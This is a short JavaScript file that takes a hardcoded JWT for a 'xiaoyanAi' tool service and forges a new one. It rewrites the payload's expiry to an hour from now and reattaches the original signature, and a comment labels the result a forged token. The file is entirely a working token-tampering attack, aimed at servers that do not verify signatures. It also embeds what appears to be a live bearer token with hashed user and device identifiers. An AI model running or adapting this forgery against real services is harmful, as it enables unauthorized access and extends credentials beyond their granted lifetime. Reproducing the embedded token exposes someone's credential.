const token = "eyJhbGciOiJSUzUxMiJ9.eyJpc3MiOiJ4aWFveWFuQWkiLCJzdWIiOiJ0b29sLXRva2VuIiwiYXVkIjpbInRvb2wiXSwiaWF0IjoxNzgxMzQ0MTg2LCJleHAiOjE3ODE5NDg5ODYsImp0aSI6ImYyOWYzOTJhLTNjN2MtNDg0ZC1iYWMwLTdlMTVhYTcxYTk0NSIsInRvb2xDb2RlIjoiZG91YmFvIiwib3BlbklkSGFzaCI6ImJlMTAwYzBhMjQ5NTcyODQ2MDdhOTU4NjdmOTg3MTY0ZTMzYjQzM2Q4OWY3ZjBmYTMxOWJlMDYwNzYwMTkwNzYiLCJkZXZpY2VJZEhhc2giOiJjNDExMWM5NGQwOWVjOGY2OTE3ZjRmODkwYzVmZDBkZTYzZDQ0MWQ2YjU2N2Y2NDk2NDVkODEzZGY5ZmQzMWY0IiwidHlwIjoidG9vbC10b2tlbiJ9.AaGdUTt9dcDuhII8mkq-1-ob8Aodrbe5b-9o2ZqsV7G827sC8W83hemP-L0g1vvYM8QihLYU75_lV0X1RGieOmVqbDZ_HVUbRk_O9aFYTYp9oOQCMovRMEOFwsbZrvZNLZ8y-UN4MnU08Y7sYTXYpr5NMRqZ2p64UjZ2hoAyCmCQdxMoSk48mkWnp4UxIV61KBM7rtReeJ-1g9QkaJlKAYGv8jQPwl8JNHtXBbzHdaK60vBMDzfuxh6KjMu-JlVaJ48afmpi2fyyo88GFZVX1V3220xb71SfMA-V3acJlPkdPRFZhJkD-wtOvPDOjBy_YzXh1RL2Bcnvc0YxD06o1Q"

function b64urlDecode(s) {
    s = s.replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4) s += "=";
    return Buffer.from(s, "base64").toString("utf8");
}

function b64urlEncode(obj) {
    return Buffer.from(JSON.stringify(obj))
        .toString("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
}

const [headerB64, payloadB64, signature] = token.split(".");

const header = JSON.parse(b64urlDecode(headerB64));
const payload = JSON.parse(b64urlDecode(payloadB64));

payload.exp = Math.floor(Date.now() / 1000) + 3600;

// 伪造的token
const tampered = [
    b64urlEncode(header),
    b64urlEncode(payload),
    signature
].join(".");

console.log(tampered);

